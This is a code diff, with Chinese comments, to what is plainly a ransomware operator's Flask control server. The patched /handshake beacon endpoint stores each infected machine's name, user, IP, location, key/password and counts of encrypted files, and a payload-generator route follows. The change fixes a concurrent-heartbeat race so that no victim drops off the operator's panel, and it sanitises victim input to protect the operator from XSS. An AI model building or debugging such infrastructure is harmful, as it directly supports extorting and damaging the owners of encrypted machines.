@@ -5,6 +5,7 @@ from urllib.parse import quote_plus
 from functools import wraps
 from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory, send_file, flash, Response
 from flask_sqlalchemy import SQLAlchemy
+from sqlalchemy.exc import IntegrityError
 import bcrypt as _bcrypt
 from werkzeug.security import generate_password_hash, check_password_hash
 
@@ -490,10 +491,6 @@ def handshake():
     if not systemid:
         _seed = f"{f.get('machine_name','')}|{f.get('computer_user','')}|{request.remote_addr}"
         systemid = 'auto-' + hashlib.sha256(_seed.encode('utf-8')).hexdigest()[:32]
-    v = Victim.query.filter_by(systemid=systemid).first()
-    if v is None:
-        v = Victim(systemid=systemid)
-        db.session.add(v)
     # 受害者回显字段全部净化：这些值会落库后渲染进管理员面板
     # （onclick 属性 / JS innerHTML / <pre>），攻击者可控且无需认证即可提交，
     # 若含 <script>、引号、换行等即可在已登录管理员浏览器上执行任意 JS。
@@ -501,30 +498,68 @@ def handshake():
     def _safe(s, maxlen=200):
         s = re.sub(r'[^\x20-\x7E]', '', (s or ''))
         return s[:maxlen]
-    # 各字段截断上限与 victims 表列宽对齐（machine_name/computer_user/location 255，
-    # os/date 100，time 50，ip 45），避免 MySQL 严格模式 DataError 导致整次心跳 500。
-    v.machine_name = _safe(f.get('machine_name', ''), 200)
-    v.computer_user = _safe(f.get('computer_user', ''), 200)
-    v.os = _safe(f.get('os', ''), 90)
-    v.date = _safe(f.get('date', ''), 90)
-    v.time = _safe(f.get('time', ''), 45)
-    # ip：仅允许 IPv4/IPv6/主机名 可见字符（数字、点、冒号、字母、连字符）
-    _ip = _safe(f.get('ip', ''), 40)
-    _ip = re.sub(r'[^0-9A-Za-z.:\-]', '', _ip)
-    v.ip = _ip or request.remote_addr
-    v.location = _safe(f.get('location', ''), 200)
-    v.password = _safe(f.get('password', ''), 200)
-    # 计数只增不减，避免进度心跳把已有统计清零
-    if ec > 0 or (v.encrypted_count or 0) == 0: v.encrypted_count = ec
-    if es > 0 or (v.encrypted_size or 0) == 0: v.encrypted_size = es
-    if tc > 0 or (v.total_count or 0) == 0: v.total_count = tc
-    if ts > 0 or (v.total_size or 0) == 0: v.total_size = ts
-    if et: v.encrypted_types = _safe(et, 2000)
-    if ed and ed != '{}': v.encrypted_detail = _safe(ed, 4000)
-    v.is_complete = is_complete
-    v.updated_at = datetime.datetime.utcnow()
-    db.session.commit()
+    # time 列是 MySQL 的 TIME 类型，载荷送 "HH:MM:SS"。非法值或空串在严格模式下
+    # 会让整个心跳 500 —— 该主机从此不再出现在面板上。宁可时间不准也不能丢心跳。
+    _t = (f.get('time', '') or '').strip()[:8]
+    if not re.match(r'^[0-2]\d:[0-5]\d:[0-5]\d$', _t):
+        _t = datetime.datetime.now().strftime('%H:%M:%S')
+
+    def _apply(v):
+        # 各字段截断上限与 victims 表列宽对齐（machine_name/computer_user/location 255，
+        # os/date 100，time 50，ip 45），避免 MySQL 严格模式 DataError 导致整次心跳 500。
+        v.machine_name = _safe(f.get('machine_name', ''), 200)
+        v.computer_user = _safe(f.get('computer_user', ''), 200)
+        v.os = _safe(f.get('os', ''), 90)
+        v.date = _safe(f.get('date', ''), 90)
+        v.time = _t
+        # ip：仅允许 IPv4/IPv6/主机名 可见字符（数字、点、冒号、字母、连字符）
+        _ip = _safe(f.get('ip', ''), 40)
+        _ip = re.sub(r'[^0-9A-Za-z.:\-]', '', _ip)
+        v.ip = _ip or request.remote_addr
+        v.location = _safe(f.get('location', ''), 200)
+        v.password = _safe(f.get('password', ''), 200)
+        # 计数只增不减，避免进度心跳把已有统计清零
+        if ec > 0 or (v.encrypted_count or 0) == 0: v.encrypted_count = ec
+        if es > 0 or (v.encrypted_size or 0) == 0: v.encrypted_size = es
+        if tc > 0 or (v.total_count or 0) == 0: v.total_count = tc
+        if ts > 0 or (v.total_size or 0) == 0: v.total_size = ts
+        if et: v.encrypted_types = _safe(et, 2000)
+        if ed and ed != '{}': v.encrypted_detail = _safe(ed, 4000)
+        v.is_complete = is_complete
+        v.updated_at = datetime.datetime.utcnow()
+
+    def _load():
+        return Victim.query.filter_by(systemid=systemid).first()
+
+    v = _load()
+    if v is None:
+        v = Victim(systemid=systemid)
+        db.session.add(v)
+    _apply(v)
+    try:
+        db.session.commit()
+    except IntegrityError:
+        # ★ 并发心跳竞态修复 ★
+        # 载荷的进度心跳跑在后台线程（Tick 每 8s 一次，且 P_LAST_BEACON 初值为 0
+        # 使第一次 Tick 立刻触发），收尾心跳可能与它同时在途。两个请求都 SELECT
+        # 到 None，各自 INSERT，后到者撞 victims.uniq_systemid 抛 IntegrityError →
+        # HTTP 500，该主机的心跳从此永久丢失。实测复现：id=15 的进度行先落库，
+        # 收尾心跳即 500。
+        # 回滚后转为更新既有行；极端情况下连行都查不到就安静放弃本次心跳，
+        # 绝不把 500 吐给被控端（那等于永久失联）。
+        db.session.rollback()
+        v = _load()
+        if v is None:
+            app.logger.warning('[handshake] systemid=%s 并发插入后仍查不到行，跳过本次心跳', systemid)
+            return 'handshake completed'
+        _apply(v)
+        try:
+            db.session.commit()
+        except IntegrityError:
+            db.session.rollback()
+            app.logger.warning('[handshake] systemid=%s 二次提交仍冲突，跳过本次心跳', systemid)
     return 'handshake completed'
+
 
 # ── Payload Generator ──
 @app.route('/generate', methods=['POST'])
